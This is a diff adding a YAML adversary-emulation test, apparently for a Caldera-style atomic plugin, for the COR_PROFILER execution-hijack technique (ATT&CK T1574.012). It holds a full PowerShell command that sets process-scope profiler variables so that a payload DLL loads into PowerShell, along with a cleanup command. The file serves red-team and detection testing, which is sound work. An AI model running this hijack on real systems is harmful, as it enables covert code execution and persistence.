@@ -1,0 +1,28 @@
+---
+- id: 7179bb4957f1f7f3004ea70c714a8fb9
+  name: Registry-free process scope COR_PROFILER
+  description: 'Creates process scope environment variables to enable a .NET profiler
+    (COR_PROFILER) without making changes to the registry. The unmanaged profiler
+    DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.
+
+
+    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1574.012
+    name: 'Hijack Execution Flow: COR_PROFILER'
+  platforms:
+    windows:
+      psh:
+        command: $env:COR_ENABLE_PROFILING = 1; $env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}';
+          $env:COR_PROFILER_PATH = '"83f016_T1574.012x64.dll"'; POWERSHELL -c 'Start-Sleep
+          1'
+        payloads:
+        - 83f016_T1574.012x64.dll
+        cleanup: $env:COR_ENABLE_PROFILING = 0; $env:COR_PROFILER = ''; $env:COR_PROFILER_PATH
+          = ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
